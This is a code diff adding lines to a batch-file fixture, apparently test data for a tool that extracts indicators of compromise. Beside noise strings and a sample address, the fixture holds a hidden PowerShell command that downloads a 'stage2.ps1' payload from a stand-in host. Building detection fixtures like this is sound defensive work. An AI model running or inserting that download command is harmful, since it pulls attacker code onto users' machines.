@@ -998,6 +998,8 @@ def ioc_noise_bat() -> bytes:
         r"rem noise: C:\a\x4d\x5a\x90\x00",
         "rem noise: C:\\\xc3\xa2\xc3\xa3\xc3\xa4\xc3\xa5\\data",
         r"rem noise: C:\Tools\DocuTraceX\tools\python\python.exe",
+        "rem noise (no such TLD at IANA): cfg.zz row.qq data.xx",
+        "rem real: reply to accounts@billing-portal.example",
         "powershell -nop -w hidden -c \"iwr http://billing-portal.example/inv/stage2.ps1\"",
         "",
     ]
